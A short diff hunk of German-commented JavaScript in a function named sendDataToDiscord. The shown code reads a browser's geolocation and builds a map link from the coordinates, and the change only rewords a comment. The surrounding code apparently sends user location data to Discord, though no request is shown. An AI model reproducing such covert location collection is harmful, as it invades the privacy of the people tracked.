@@ -33,7 +33,7 @@ async function sendDataToDiscord() {
                         const { latitude, longitude } = position.coords;
                         resolve(`Breitengrad: ${latitude}, Längengrad: ${longitude}`);
                         
-                        // Erstelle den Link für die Geolocation
+                        // Link für die Geolocation
                         geolocationLink = `https://www.koordinaten-umrechner.de/decimal/${latitude},${longitude}?karte=OpenStreetMap&zoom=9`;
                     },
                     (error) => {
